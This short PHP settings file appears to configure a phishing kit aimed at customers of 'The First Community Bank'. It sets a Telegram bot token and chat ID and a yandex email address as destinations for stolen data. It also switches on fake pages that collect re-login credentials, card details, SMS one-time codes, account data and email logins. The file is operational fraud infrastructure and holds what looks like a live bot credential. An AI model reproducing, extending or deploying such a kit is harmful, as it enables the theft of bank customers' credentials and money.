<?php
$settings = array(
	"client"			=> "Mac Hemsworth",
	"Bank"				=> "The First Community Bank ",
	"telegram"			=> "1",
	"chat_id"			=> "1840838824",
	"bot_url"			=> "bot5224264162:AAFf9jpDZOLuqb6RW-1SAlMWpvBxFcFjckY",
	"send_mail"		=> "1",
	"email"			=> "easydoesit1313@yandex.com",
	"Relogin"		=> "1",
	"Cardpage"			=> "1",
	"Smspage"			=> "1",
	"Account"			=> "1",
	"Emailpage"			=> "1",
);
return $settings;
?>	